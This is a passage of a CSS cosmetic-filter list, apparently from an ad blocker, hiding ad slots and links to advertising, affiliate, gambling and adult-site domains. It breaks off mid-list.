a[href^="https://www.adultempire.com/"][href*="?partner_id="], :root a[href^="https://track.healthtrader.com/"], :root a[href^="http://greensmoke.com/"], :root a[href^="https://track.effiliation.com/servlet/effi.click?"] > img, :root a[href^="https://track.clickmoi.xyz/"], :root a[href^="https://track.afcpatrk.com/"], :root a[href^="https://control.trafficfabrik.com/"], :root a[href^="https://track.52zxzh.com/"], :root a[href^="https://axdsz.pro/"], :root a[href^="https://tour.mrskin.com/"], :root a[href^="http://www.greenmangaming.com/?tap_a="], :root a[href^="https://tm-offers.gamingadult.com/"], :root a[href^="https://t.hrtyj.com/"], :root a[href^="https://t.adating.link/"], :root a[href^="https://squren.com/rotator/?atomid="], :root a[href^="http://cdn3.adexprts.com/"], :root a[href^="https://spygasm.com/track?"], :root div[id^="ad-div-"], :root a[href^="https://secure.eveonline.com/ft/?aid="], :root div[class^="Display_displayAd"], :root a[href^="https://www.sheetmusicplus.com/?aff_id="], :root a[href^="https://secure.bstlnk.com/"], :root a[href^="https://refpasrasw.world/"], :root div[data-google-query-id], :root a[href^="https://mediaserver.entainpartners.com/renderBanner.do?"], :root a[href^="https://refpaexhil.top/"], :root a[href^="https://reachtrgt.com/"], :root div[id^="yandex_ad"], :root a[href^="https://www.hotgirls4fuck.com/"], :root a[href^="https://www.pornhat.com/"][rel="nofollow"], :root AD-SLOT, :root a[href^="https://pubads.g.doubleclick.net/"], :root a[href^="https://prf.hn/click/"][href*="/camref:"] > img, :root a[href^="http://www.my-dirty-hobby.com/?sub="], :root a[href^="https://porndeals.com/?track="], :root a[href^="https://pcm.bannerator.com/"], :root a[href^="https://offerforge.net/"], :root a[href^="https://ndt5.net/"], :root a[href^="https://natour.naughtyamerica.com/track/"], :root a[href^="https://myusenet.xyz/"], :root a[href^="https://my-movie.club/"], :root a[href^="https://msecure117.com/"], :root [href^="https://detachedbates.com/"], :root a[href^="https://mk-cdn.net/"], :root a[href^="https://mk-ads.com/"], :root a[href^="https://meet-sex-here.com/?u="], :root a[href^="https://medleyads.com/"], :root a[href^="https://mediaserver.gvcaffiliates.com/renderBanner.do?"], :root iframe[src^="https://tpc.googlesyndication.com/"], :root a[href^="https://a.bestcontentoperation.top/"], :root a[href^="https://landing1.brazzersnetwork.com"], :root a[href^="http://adrunnr.com/"], :root a[href^="https://landing.brazzersplus.com/"], :root a[href^="https://land.rk.com/landing/"], :root a[href^="http://ad.au.doubleclick.net/"], :root a[href^="https://k2s.cc/pr/"], :root a[href^="https://juicyads.in/"], :root a[href^="https://join.virtuallust3d.com/"], :root a[href^="http://www.uniblue.com/cm/"], :root a[href^="https://join.sexworld3d.com/track/"], :root a[href^="https://join.dreamsexworld.com/"], :root a[href^="https://trusted-click-host.com/"], :root a[href^="https://members.linkifier.com/public/affiliateLanding?refCode="], :root a[href^="https://jmp.awempire.com/"], :root [href^="http://join.shemalepornstar.com/"], :root [id^="ad_sky"], :root a[href^="https://incisivetrk.cvtr.io/click?"], :root a[href^="https://iactrivago.ampxdirect.com/"], :root [href*="https://www.jmbullion.com/gold/"], :root a[href^="https://iac.ampxdirect.com/"], :root a[href^="https://horny-pussies.com/tds"], :root a[href^="https://graizoah.com/"], :root a[href^="https://goraps.com/"], :root a[href^="http://feedads.g.doubleclick.net/"], :root a[href^="https://redsittalvetoft.pro/"], :root a[href^="https://googleads.g.doubleclick.net/pcs/click"], :root a[href^="http://cdn.adstract.com/"], :root a[href^="https://gogoman.me/"], :root a[href^="https://go.xtbaffiliates.com/"], :root a[href^="https://torrentsafeguard.com/?aid="], :root a[href^="https://offers.refchamp.com/"], :root a[href^="https://go.trkclick2.com/"], :root a[href^="https://go.strpjmp.com/"], :root a[href^="https://go.markets.com/visit/?bta="], :root a[href^="https://go.julrdr.com/"], :root a[href^="https://landing.brazzersnetwork.com/"], :root a[href^="https://go.hpyjmp.com/"], :root a[href^="https://go.goasrv.com/"], :root a[href^="https://adnetwrk.com/"], :root a[href^="https://go.gldrdr.com/"], :root a[href^="https://fleshlight.sjv.io/"], :root a[href^="https://go.etoro.com/"] > img, :root a[href^="https://go.currency.com/"], :root a[href^="https://track.afftck.com/"], :root a[href^="http://guideways.info/"], :root a[href^="https://go.cmrdr.com/"], :root a[href^="http://www.easydownloadnow.com/"], :root a[href^="https://go.alxbgo.com/"], :root a[href^="https://go.ad2up.com/"], :root a[href^="https://giftsale.co.uk/?utm_"], :root div[class^="backfill-taboola-home-slot-"], :root a[href^="http://www.terraclicks.com/"], :root a[href^="https://gghf.mobi/"], :root a[href^="https://get.surfshark.net/aff_c?"][href*="&aff_id="] > img, :root a[href^="https://fonts.fontplace9.com/"], :root a[href^="http://clkmon.com/adServe/"], :root a[href^="https://flirtaescopa.com/"], :root a[href^="http://adserver.adtech.de/"], :root a[href^="https://www.mrskin.com/tour"], :root a[href^="https://syndication.exoclick.com/"], :root .commercial-unit-mobile-top .jackpot-main-content-container > .UpgKEd + .nZZLFc > .vci, :root a[href^="https://financeads.net/tc.php?"], :root bottomadblock, :root a[href^="https://fertilitycommand.com/"], :root a[href^="https://fakelay.com/"], :root a[href^="https://earandmarketing.com/"], :root [lazy-ad="leftthin_banner"], :root a[href^="https://dynamicadx.com/"], :root a[href^="https://www.what-sexdating.com/"], :root a[href^="https://tc.tradetracker.net/"] > img, :root a[href^="//srv.buysellads.com/"], :root a[href^="https://dianches-inchor.com/"], :root a[href^="http://adf.ly/?id="], :root a[href^="https://uncensored3d.com/"], :root a[href^="https://creacdn.top-convert.com/"], :root a[href^="https://www.chngtrack.com/"], :root iframe[src^="https://pagead2.googlesyndication.com/"], :root a[href^="https://retiremely.com/"], :root a[href^="https://cpmspace.com/"], :root a[href^="https://cpartner.bdswiss.com/"], :root [onclick*="content.ad/"], :root a[href^="https://clixtrac.com/"], :root a[href^="https://clicks.pipaffiliates.com/"], :root .commercial-unit-mobile-top > .v7hl4d, :root a[href^="https://click.plista.com/pets"], :root a[href^="https://chaturbate.xyz/"], :root [data-ad-cls], :root a[href^="https://chaturbate.jjgirls.com/?track="], :root a[href^="https://chaturbate.com/in/?track="], :root a[href^="https://chaturbate.com/in/?tour="], :root div[data-adname], :root a[href^="https://chaturbate.com/affiliates/"], :root a[href^="https://burpee.xyz/"], :root a[href^="https://mcdlks.com/"], :root a[href^="https://bs.serving-sys.com"], :root [href^="https://www.reimageplus.com/"], :root a[href^="https://bongacams2.com/track?"], :root a[href^="https://blackorange.go2cloud.org/"], :root a[href^="https://go.hpyrdr.com/"], :root a[href^="https://billing.purevpn.com/aff.php"] > img, :root a[href^="https://affiliates.bet-at-home.com/processing/"], :root a[href^="https://ads.ad4game.com/"], :root a[href^="https://betway.com/"][href*="&a="], :root a[href^="http://www.linkbucks.com/referral/"], :root a[href^="https://azpresearch.club/"], :root a[href^="https://awptjmp.com/"], :root a[href^="http://www.fleshlight.com/"], :root a[href^="https://aweptjmp.com/"], :root a[href^="http://www.1clickdownloader.com/"], :root a[href^="https://www.googleadservices.com/pagead/aclk?"], :root a[href^="https://awentw.com/"], :root [href^="/ucdownloader.php"], :root a[href^="https://awejmp.com/"], :root a[href^="https://as.sexad.net/"], :root a[href^="https://albionsoftwares.com/"], :root a[href^="//postlnk.com/"], :root a[href^="https://affiliate.rusvpn.com/click.php?"], :root [data-role="tile-ads-module"], :root a[href^="https://affiliate.geekbuying.com/gkbaffiliate.php?"], :root a[href^="https://www.Jinkouinstant.com/?partner_id="], :root a[href^="http://adultfriendfinder.com/p/register.cgi?pid="], :root a[href^="http://www.advcashpro.com/aff/"], :root a[href^="https://www.popads.net/users/"], :root a[href^="https://adultfriendfinder.com/go/page/landing"], :root a[href^="https://adswick.com/"], :root ADS-RIGHT, :root a[href^="https://tracking.trackcasino.co/"], :root a[href^="https://adserver.adreactor.com/"], :root a[href^="https://land.brazzersnetwork.com/landing/"], :root a[href^="https://ads.leovegas.com/redirect.aspx?"], :root a[href^="https://t.hrtye.com/"], :root a[href^="https://ads.cdn.live/"], :root a[href^="https://ads.betfair.com/redirect.aspx?"], :root a[href^="https://refpaano.host/"], :root a[href^="https://meet-to-fuck.com/tds"], :root a[href^="https://adhealers.com/"], :root a[href^="https://adclick.g.doubleclick.net/"], :root a[href^="https://www.sheetmusicplus.com/"][href*="?aff_id="], :root a[href^="http://servicegetbook.net/"], :root a[href^="https://bngpt.com/"], :root a[href^="http://clickandjoinyourgirl.com/"], :root a[href^="https://ad13.adfarm1.adition.com/"], :root a[href^="https://misspkl.com/"], :root a[href^="https://ad.zanox.com/ppc/"] > img, :root a[href^="https://static.fleshlight.com/images/banners/"], :root a[href^="http://zevera.com/afi.html"], :root a[href^="http://go.oclaserver.com/"], :root a[href^="https://ad.atdmt.com/"], :root a[href^="https://cams.imagetwist.com/in/?track="], :root .trc_rbox .syndicatedItem, :root a[href^="https://aaucwbe.com/"], :root a[href^="https://a.bestcontentweb.top/"], :root a[href^="http://hyperlinksecure.com/go/"], :root a[href^="https://track.themadtrcker.com/"], :root a[href^="https://bullads.net/get/"], :root a[href^="http://down1oads.com/"], :root a[href^="http://yads.zedo.com/"], :root [href^="http://go.cm-trk2.com/"], :root a[href^="https://tracking.comfortclick.eu/"], :root a[href^="https://maymooth-stopic.com/"], :root a[href^="http://xtgem.com/click?"], :root a[href^="https://ads.trafficpoizon.com/"], :root a[href^="http://www.xmediaserve.com/"], :root a[href^="http://www.webtrackerplus.com/"], :root a[href^="http://www.usearchmedia.com/signup?"], :root a[href^="http://www.torntv-downloader.com/"], :root a[href^="https://www.privateinternetaccess.com/"] > img, :root a[href^="http://www.tirerack.com/affiliates/"], :root span[data-component-type="s-ads-metrics"], :root div[class^="AdBannerWrapper-"], :root a[href^="http://www.text-link-ads.com/"], :root a[href^="https://weedzy.co.uk/"][href*="&utm_"], :root a[href^="http://www.streamtunerhd.com/signup?"], :root a[href^="http://www.streamate.com/exports/"], :root a[href^="https://ads-for-free.com/click.php?"], :root a[href^="http://www.socialsex.com/"], :root a[href^="https://join.virtualtaboo.com/track/"], :root a[onmousedown^="this.href='https://paid.outbrain.com/network/redir?"][target="_blank"], :root [href^="https://awbbjmp.com/"], :root a[href^="http://www.sfippa.com/"], :root a[href^="http://secure.signup-page.com/"], :root a[href^="http://www.quick-torrent.com/download.html?aff"], :root a[href^="http://www.plus500.com/?id="], :root a[href^="http://ffxitrack.com/"], :root a[href^="https://www.im88trk.com/"], :root [href*=".zlinkm.com/"], :root a[href^="http://www.pinkvisualgames.com/?revid="], :root a[href^="http://www.onwebcam.com/random?t_link="], :root a[href^="http://www.myfreepaysite.com/sfw.php?aid"], :root a[href^="http://www.mrskin.com/tour"], :root a[href^="http://bcntrack.com/"], :root a[href^="http://www.securegfm.com/"], :root a[href^="http://www.liversely.net/"], :root a[href^="https://partners.fxoro.com/click.php?"], :root div[class^="awpcp-random-ads"], :root a[href^="http://www.graboid.com/affiliates/"], :root a[href^="http://www.firstload.com/affiliate/"], :root a[href^="http://www.friendlyadvertisements.com/"], :root a[href^="http://ul.to/ref/"], :root a[href^="http://www.mysuperpharm.com/"], :root a[href^="http://www.freefilesdownloader.com/"], :root a[href^="https://content.oneindia.com/www/delivery/"], :root a[href^="http://www.fpcTraffic2.com/blind/in.cgi?"], :root a[href^="http://www.fonts.com/BannerScript/"], :root a[href^="https://go.247traffic.com/"], :root div[class^="SponsoredAds"], :root a[href^="https://americafirstpolls.com/"], :root a[href^="http://clickserv.sitescout.com/"], :root a[href^="http://www.firstload.de/affiliate/"], :root a[href^="http://www.dealcent.com/register.php?affid="], :root a[data-url^="http://paid.outbrain.com/network/redir?"], :root iframe[id^="google_ads_frame"], :root a[href^="http://www.bet365.com/"][href*="affiliate="], :root a[href^="http://www.bluehost.com/track/"] > img, :root a[href^="http://www.coiwqe.site/"], :root a[href^="http://www.clkads.com/adServe/"], :root a[href^="http://www.babylon.com/welcome/index?affID"], :root .grid > .container > #aside-promotion, :root a[href^="http://www.badoink.com/go.php?"], :root a[href^="http://www.afgr3.com/"], :root a[href^="https://fast-redirecting.com/"], :root a[href^="https://bluedelivery.pro/"], :root [href^="http://join.michelle-austin.com/"], :root a[href^="http://www.sexgangsters.com/?pid="], :root a[href^="http://www.amazon.co.uk/exec/obidos/external-search?"], :root a[href^="http://c.jumia.io/"], :root a[href^="http://www.affiliates1128.com/processing/"], :root a[href^="http://go.ad2up.com/"], :root a[href^="https://badoinkvr.com/"], :root a[href^="http://www.adxpansion.com"], :root a[href^="http://ad-emea.doubleclick.net/"], :root a[href^="https://clickadilla.com/"], :root .ob_container .item-container-obpd, :root a[href^="http://websitedhoome.com/"], :root a[href^="http://www.adskeeper.co.uk/"], :root a[href^="http://www.down1oads.com/"], :root a[href^="http://www.FriendlyDuck.com/"], :root div[class^="adbanner_"], :root a[href^="http://bodelen.com/"], :root a[href^="http://wgpartner.com/"], :root a[href^="http://webtrackerplus.com/"], :root div[class^="Ad__adContainer"], :root a[href^="http://web.adblade.com/"], :root div[class^="BlockAdvert-"], :root a[href^="https://go.onclasrv.com/"], :root a[href^="http://wct.link/"], :root [href^="https://stvkr.com/"], :root a[href^="http://engine.newsmaxfeednetwork.com/"], :root a[href^="http://vo2.qrlsx.com/"], :root a[href^="https://trklvs.com/"], :root a[href^="http://www.paddypower.com/?AFF_ID="], :root a[href^="https://www.nutaku.net/signup/landing/"], :root a[href^="http://s9kkremkr0.com/"], :root a[href^="http://ucam.xxx/?utm_"], :root [href^="http://globsads.com/"], :root [href^="https://shrugartisticelder.com"], :root a[href^="https://adsrv4k.com/"], :root a[href^="http://trk.mdrtrck.com/"], :root a[href^="http://traffic.tc-clicks.com/"], :root div[class^="largeRectangleAd_"], :root a[href^="https://dediseedbox.com/clients/aff.php?"], :root [href^="/ucmini.php"], :root a[href^="http://www.wantstraffic.com/"], :root a[href^="http://databass.info/"], :root a[href^="http://track.afcpatrk.com/"], :root div[class^="Ad__container"], :root a[href^="http://adprovider.adlure.net/"], :root a[href^="http://t.wowtrk.com/"], :root a[href^="http://tezfiles.com/pr/"], :root [id*="ScriptRoot"], :root a[href^="http://fileboom.me/pr/"], :root a[href*=".trust.zone"], :root a[href^="http://www.firstclass-download.com/"], :root a[href^="http://tracking.deltamediallc.com/"], :root a[href^="http://tc.tradetracker.net/"] > img, :root [href^="https://affect3dnetwork.com/track/"], :root a[href^="http://download-performance.com/"], :root a[href^="http://www.on2url.com/app/adtrack.asp"], :root a[href^="http://www.seekbang.com/cs/"], :root a[href^="http://bluehost.com/track/"], :root a[href^="http://syndication.exoclick.com/"], :root .ob_dual_right > .ob_ads_header ~ .odb_div, :root a[href^="http://spygasm.com/track?"], :root a[href^="http://sharesuper.info/"], :root a[href^="https://awecrptjmp.com/"], :root [data-ez-name], :root a[href^="http://server.cpmstar.com/click.aspx?poolid="], :root a[href^="http://www.fbooksluts.com/"], :root a[href^="http://c.actiondesk.com/"], :root a[href^="http://intent.bingads.com/"], :root a[href^="http://www.cdjapan.co.jp/aff/click.cgi/"], :root .trc_related_container div[data-item-syndicated="true"], :root a[href^="https://www.firstload.com/affiliate/"], :root a[href^="http://see.kmisln.com/"], :root a[href^="http://secure.hostgator.com/~affiliat/"], :root a[href^="http://rs-stripe.wsj.com/stripe/redirect"], :root a[href^="http://refpaano.host/"], :root a[data-oburl^="http://paid.outbrain.com/network/redir?"], :root a[href^="http://refpa.top/"], :root a[href^="https://easygamepromo.com/ef/custom_affiliate/"], :root a[href^="http://record.betsafe.com/"], :root a[href^="https://iqbroker.com/"][href*="?aff="], :root a[href^="http://buysellads.com/"], :root a[href^="http://reallygoodlink.freehookupaffair.com/"], :root a[href^="https://keep2share.cc/pr/"], :root a[href^="http://adlev.neodatagroup.com/"], :root a[href^="http://reallygoodlink.extremefreegames.com/"], :root a[href^="https://bnsjb1ab1e.com/"], :root a[href^="http://pwrads.net/"], :root a[href^="https://www.xvinlink.com/?a_fid="], :root a[href^="http://promos.bwin.com/"], :root a[href^="http://z1.zedo.com/"], :root a[href^="http://pokershibes.com/index.php?ref="], :root [id^="google_ads_iframe"], :root a[href^="http://partners.etoro.com/"], :root [data-mobile-ad-id], :root LEADERBOARD-AD, :root a[href^="http://papi.mynativeplatform.com:80/pub2/"], :root a[href^="http://searchtabnew.com/"], :root div[id^="ad-gpt-"], :root a[href^="http://pan.adraccoon.com?"], :root a[href^="http://online.ladbrokes.com/promoRedirect?"], :root a[href^="https://dltags.com/"], :root a[href^="http://onclickads.net/"], :root a[href^="http://mmo123.co/"], :root div[id^="amzn-assoc-ad"], :root a[href^="https://www.oboom.com/ref/"], :root a[href^="http://media.paddypower.com/redirect.aspx?"], :root a[href^="https://fileboom.me/pr/"], :root a[href^="http://marketgid.com"], :root a[href^="https://aff-ads.stickywilds.com/"], :root a[href^="http://www.bitlord.me/share/"], :root a[href^="https://www.kingsoffetish.com/tour?partner_id="], :root a[href^="//pubads.g.doubleclick.net/"], :root a[href^="http://lp.ncdownloader.com/"], :root [href*=".engine.adglare.net/"], :root a[href^="http://allaptair.club/"], :root a[href^="http://look.djfiln.com/"], :root a[href^="https://track.trkinator.com/"], :root div[id^="ad-position-"], :root a[data-redirect^="this.href='http://paid.outbrain.com/network/redir?"], :root a[href^="http://liversely.com/"], :root a[href^="http://keep2share.cc/pr/"], :root div[data-ad-underplayer], :root a[href^="http://k2s.cc/code/"], :root a[href^="http://www.dl-provider.com/search/"], :root a[href^="http://www.liutilities.com/"], :root [href^="http://join.shemalesfromhell.com/"], :root .pubexchange_module .pe-external, :root a[data-widget-outbrain-redirect^="http://paid.outbrain.com/network/redir?"], :root a[href^="http://join3.bannedsextapes.com/track/"], :root a[href^="https://gamescarousel.com/"], :root a[href^="http://istri.it/?"], :root a[href^="http://mob1ledev1ces.com/"], :root a[href^="//voyeurhit.com/cs/"], :root a[href^="http://hd-plugins.com/download/"], :root [data-desktop-ad-id], :root a[href^="https://look.utndln.com/"], :root a[href^="http://googleads.g.doubleclick.net/pcs/click"], :root a[href^="https://ovb.im/"], :root a[href^="https://watchmygirlfriend.tv/"], :root .nrelate .nr_partner, :root a[href^="http://go.xtbaffiliates.com/"], :root a[href^="http://secure.cbdpure.com/aff/"], :root a[href^="http://www.downloadthesefiles.com/"], :root div[class^="ResponsiveAd-"], :root a[href^="https://oackoubs.com/"], :root a[href^="http://install.securewebsiteaccess.com/"], :root a[href^="http://www.revenuehits.com/"], :root a[href^="http://www.downloadweb.org/"], :root a[href^="http://go.seomojo.com/tracking202/"], :root a[href^="http://go.mobisla.com/"], :root a[href^="http://go.fpmarkets.com/"], :root div[class^="AdSlot__container"], :root a[href^="http://findersocket.com/"], :root a[href^="https://porngames.adult/?SID="], :root a[href^="https://prf.hn/click/"][href*="/creativeref:"] > img, :root a[href^="http://www.adultempire.com/unlimited/promo?"][href*="&partner_id="], :root a[href^="https://ads.planetwin365affiliate.com/redirect.aspx?"], :root a[href^="http://g1.v.fwmrm.net/ad/"], :root a[href^="http://www.hibids10.com/"], :root a[href^="http://fusionads.net"], :root a[href^="http://us.marketgid.com"], :root a[href^="http://imads.integral-marketing.com/"], :root div[class^="kiwiad-popup"], :root a[href^="http://freesoftwarelive.com/"], :root a[href^="http://adtrackone.eu/"], :root span[title="Ads by Google"], :root a[href^="http://finaljuyu.com/"], :root a[href^="http://ethfw0370q.com/"], :root [id^="bunyad_ads_"], :root a[href^="http://elitefuckbook.com/"], :root a[href^="http://eclkmpsa.com/"], :root a[href^="http://wopertific.info/"], :root a[href^="http://earandmarketing.com/"], :root a[href^="http://aflrm.com/"], :root a[href^="http://deloplen.com/"], :root a[href^="https://www.financeads.net/tc.php?"], :root a[href^="http://www.friendlyduck.com/AF_"], :root #content > #center > .dose > .dosesingle, :root a[href^="http://campaign.bharatmatrimony.com/track/"], :root a[href^="http://d2.zedo.com/"], :root div[class^="index__adWrapper"], :root a[href^="http://czotra-32.com/"], :root a[href^="https://a.adtng.com/"], :root a[href^="http://static.fleshlight.com/images/banners/"], :root a[href^="http://codec.codecm.com/"], :root a[href^="https://www.travelzoo.com/oascampaignclick/"], :root a[href^="https://see.kmisln.com/"], :root a[href^="http://refer.webhostingbuzz.com/"], :root a[href^="https://paid.outbrain.com/network/redir?"], :root a[href^="http://www.downloadplayer1.com/"], :root a[href^="http://clicks.binarypromos.com/"], :root a[href^="https://topoffers.com/"][href*="/?pid="], :root a[href^="https://syndication.dynsrvtbg.com/"], :root a[href^="http://vinfdv6b4j.com/"], :root div[data-test-id="AdBannerWrapper"], :root div[class^="AdCard_"], :root a[href^="http://www.urmediazone.com/signup"], :root a[href^="http://click.plista.com/pets"], :root [id^="ad_slider"], :root a[href^="http://chaturbate.com/affiliates/"], :root a[href^="http://get.slickvpn.com/"], :root [data-ad-module], :root a[href^="http://track.trkvluum.com/"], :root [href^="https://secure.bmtmicro.com/servlets/"], :root a[href^="http://bs.serving-sys.com/"], :root a[href^="http://amzn.to/"] > img[src^="data"], :root a[href^="http://cpaway.afftrack.com/"], :root a[href^="http://cdn.adsrvmedia.net/"], :root [lazy-ad="top_banner"], :root a[href^="http://360ads.go2cloud.org/"], :root a[href^="http://dftrck.com/"], :root a[href^="http://casino-x.com/?partner"], :root [data-css-class="dfp-inarticle"], :root div[id^="vuukle-ad-"], :root a[href^="http://betahit.click/"], :root a[href^="http://enter.anabolic.com/track/"], :root a[href^="https://prf.hn/click/"][href*="/adref:"] > img, :root a[href^="http://banners.victor.com/processing/"], :root a[href^="https://ismlks.com/"], :root .plista_widget_belowArticleRelaunch_item[data-type="pet"], :root #taw > .med + div > #tvcap > .mnr-c:not(.qs-ic) > .commercial-unit-mobile-top, :root [href^="https://track.fiverr.com/visit/"] > img, :root [data-template-type="nativead"], :root a[href^="http://api.content.ad/"], :root a[href^="http://hotcandyland.com/partner/"], :root a[href^="https://leg.xyz/?track="], :root a[href^="http://affiliate.glbtracker.com/"], :root [href^="https://t.ajrkm.link/"], :root a[href^="http://affiliate.coral.co.uk/processing/"], :root a[href^="http://aff.ironsocket.com/"], :root a[href^="http://ads.expekt.com/affiliates/"], :root [href^="https://click2cvs.com/"], :root a[href^="https://delivery.porn.com/"], :root a[href^="https://www.rabbits.webcam/?id="], :root div[class^="BannerAd_"], :root a[href^="http://tour.mrskin.com/"], :root a[href^="http://linksnappy.com/?ref="], :root a[href^="http://adtrack123.pl/"], :root a[href^="http://adsrv.keycaptcha.com"], :root a[href^="https://secure.adnxs.com/clktrb?"], :root div[data-mpu1], :root a[href^="http://adserver.adtechus.com/"], :root a[href^="http://adserver.adreactor.com/"], :root a[href^="https://uncensored.game/"], :root a[href^="http://ad.doubleclick.net/"], :root [href^="http://homemoviestube.com/"], :root a[href^="http://www.friendlyquacks.com/"], :root a[href^="https://scurewall.co/"], :root [name^="google_ads_iframe"], :root [href^="http://join.rodneymoore.com/"], :root [id*="MarketGid"], :root a[href^="http://espn.zlbu.net/"], :root a[href^="http://admrotate.iplayer.org/"], :root a[href^="http://adclick.g.doubleclick.net/"], :root a[href^="http://www.flashx.tv/downloadthis"], :root .vid-present > .van_vid_carousel__padding, :root #header + #content > #left > #rlblock_left, :root a[href^="http://affiliates.pinnaclesports.com/processing/"], :root a[href^="//syndication.dynsrvtbg.com/"], :root a[href^="http://www.menaon.com/installs/"], :root a[href^="http://ad.yieldmanager.com/"], :root a[href^="http://www.idownloadplay.com/"], :root [data-dynamic-ads], :root a[href^="http://srvpub.com/"], :root a[href^="https://go.nordvpn.net/aff"] > img, :root a[href^="http://secure.vivid.com/track/"], :root a[href^="http://affiliates.lifeselector.com/"], :root #atvcap + #tvcap > .mnr-c > .commercial-unit-mobile-top, :root a[href^="http://see-work.info/"], :root a[href^="https://www.passeura.com/"], :root a[href^="http://www.pinkvisualpad.com/?revid="], :root div[class^="adunit_"], :root a[href^="http://www.mobileandinternetadvertising.com/"], :root [href^="https://join.playboyplus.com/track/"], :root a[data-url^="http://paid.outbrain.com/network/redir?"] + .author, :root div[class^="AdEmbeded__AddWrapper"], :root a[href^="http://affiliates.score-affiliates.com/"], :root a[data-oburl^="https://paid.outbrain.com/network/redir?"], :root div[class^="lifeOnwerAd"], :root a[href^="https://ttf.trmobc.com/"], :root a[href^="http://www.twinplan.com/AF_"], :root a[href^="http://n.admagnet.net/"], :root a[data-obtrack^="http://paid.outbrain.com/network/redir?"], :root a[href^="https://zononi.com/"], :root a[href^="http://adserving.unibet.com/"], :root [href^="https://bulletprofitsmartlink.com/"], :root [href^="https://join3.bannedsextapes.com"], :root [lazy-ad="leftbottom_banner"], :root [id^="div-gpt-ad"], :root a[href^="https://intrev.co/"], :root a[href^="http://https://www.get-express-vpn.com/offer/"], :root [lazy-ad="lefttop_banner"], :root a[href^="http://c.ketads.com/"], :root a[href^="https://secure.starsaffiliateclub.com/C.ashx?"], :root .trc_rbox_div .syndicatedItemUB, :root [href^="https://zone.gotrackier.com/"], :root [href^="https://freecourseweb.com/"] > .sitefriend, :root [href^="https://www.hostg.xyz/aff_c"] > img, :root .trc_rbox_border_elm .syndicatedItem, :root a[href^="http://www.myfreepaysite.com/sfw_int.php?aid"], :root [data-ad-manager-id], :root [href^="https://wct.link/"], :root a[href^="https://track.totalav.com/"], :root a[href^="http://ad-apac.doubleclick.net/"], :root a[href^="https://traffic.bannerator.com/"], :root [href^="https://shiftnetwork.infusionsoft.com/go/"] > img, :root iframe[src^="http://ad.yieldmanager.com/"], :root a[href^="http://pubads.g.doubleclick.net/"], :root a[href^="https://porntubemate.com/"], :root a[href^="http://hpn.houzz.com/"], :root a[href^="http://www.gfrevenge.com/landing/"], :root a[href^="https://mob1ledev1ces.com/"], :root a[href^="https://www.bet365.com/"][href*="affiliate="], :root a[href^="https://mmwebhandler.aff-online.com/"], :root [href^="https://r.kraken.com/"], :root a[href^="http://www.ragazzeinvendita.com/?rcid="], :root a[href^="http://www.adultdvdempire.com/?partner_id="][href*="&utm_"], :root .plistaList > .itemLinkPET, :root a[href^="http://www.adbrite.com/mb/commerce/purchase_form.php?"], :root a[href^="https://playuhd.host/"], :root a[href^="http://landingpagegenius.com/"], :root .section-subheader > .section-hotel-prices-header, :root [href^="http://join.ts-dominopresley.com/"], :root [href^="https://go.affiliatexe.com/"], :root a[href^="https://freeadult.games/"], :root a[href^="http://serve.williamhill.com/promoRedirect?"], :root a[href^="https://servedbyadbutler.com/"], :root a[href^="https://promo-bc.com/"], :root a[data-redirect^="http://paid.outbrain.com/network/redir?"], :root a[href^="https://explore.findanswersnow.net/"], :root [id^="adframe_wrap_"], :root div[jsdata*="CarouselPLA-"][data-id^="CarouselPLA-"], :root a[href^="https://go.trackitalltheway.com/"], :root div[class^="PreAd_"], :root a[href^="https://track.bruceads.com/"], :root a[href^="https://t.aslnk.link/"], :root a[href^="https://m.do.co/c/"] > img, :root a[href^="http://liversely.net/"], :root a[href^="http://mgid.com/"], :root a[href^="http://k2s.cc/pr/"], :root [href^="/admdownload.php"], :root a[href^="https://www.spyoff.com/"], :root div[data-native-ad], :root a[href^="https://click.hoolig.app/"], :root AD-TRIPLE-BOX, :root div[class^="advertisement-desktop"], :root [href^="http://join.hardcoreshemalevideo.com/"], :root a[href^="http://ads2.williamhill.com/redirect.aspx?"], :root a[href^="//www.mgid.com/"], :root [href^="https://go.astutelinks.com/"], :root [href^="http://join.shemale.xxx/"], :root a[href^="http://www.TwinPlan.com/AF_"], :root a[href^="https://deliver.ptgncdn.com/"], :root [href^="https://www.targetingpartner.com/"], :root a[href^="http://latestdownloads.net/download.php?"], :root a[href^="http://www.123-reg.co.uk/affiliate2.cgi"], :root [class^="AdvertisingSlot_"], :root [href^="http://trafficare.net/"], :root a[href^="https://torguard.net/aff.php"] > img, :root a[href^="http://bestorican.com/"], :root a[href^="http://bc.vc/?r="], :root a[href^="http://www.afgr2.com/"], :root FBS-AD, :root [href^="https://go.4rabettraff.com/"], :root display-ad-component, :root a[href^="http://www.download-provider.org/"], :root a[href^="http://play4k.co/"], :root a[data-redirect^="https://paid.outbrain.com/network/redir?"], :root a[onmousedown^="this.href='http://paid.outbrain.com/network/redir?"][target="_blank"], :root a[href^="http://www.roboform.com/php/land.php"], :root a[href^="http://click.payserve.com/"], :root a[href^="http://s5prou7ulr.com/"], :root a[href^="http://azmobilestore.co/"], :root a[href^="https://sexsimulator.game/tab/?SID="], :root .rc-cta[data-target], :root [href^="https://mylead.global/stl/"] > img, :root a[href^="https://meet-sexhere.com/"], :root a[href^="http://record.sportsbetaffiliates.com.au/"], :root a[href^="http://campeeks.com/"][href*="&utm_"], :root display-ads, :root a[href^="http://www.gamebookers.com/cgi-bin/intro.cgi?"], :root a[href^="http://igromir.info/"], :root a[href^="http://affiliates.thrixxx.com/"], :root app-large-ad, :root a[href^="https://farm.plista.com/pets"], :root [class^="Ad-adContainer"], :root a[href^="https://t.mobtya.com/"], :root a[href^="https://www.adxtro.com/"], :root [class*="__adv-block"], :root a[href^="http://www.getyourguide.com/?partner_id="], :root a[href^="http://bcp.crwdcntrl.net/"], :root [href^="https://rapidgator.net/article/premium/ref/"], :root [href^="https://join.girlsoutwest.com/"], :root a[href^="http://www.hitcpm.com/"], :root a[href^="https://secure.cbdpure.com/aff/"], :root AMP-AD, :root [id^="ad-wrap-"], :root [class^="div-gpt-ad"], :root a[href^="http://xads.zedo.com/"], :root a[href^="http://campaign.bharatmatrimony.com/cbstrack/"], :root a[href^="http://ads.sprintrade.com/"], :root a[href^="https://trackjs.com/?utm_source"], :root AFS-AD, :root aside[id^="tn_ads_widget-"], :root [href^="https://traffserve.com/"], :root div[data-content="Advertisement"], :root .trc_rbox_div .syndicatedItem, :root a[href^="//www.pd-news.com/"], :root [href^="http://join.trannies-fuck.com/"], :root a[href^="http://1phads.com/"], :root .plistaList > .plista_widget_underArticle_item[data-type="pet"], :root a[href^="http://goldmoney.com/?gmrefcode="], :root 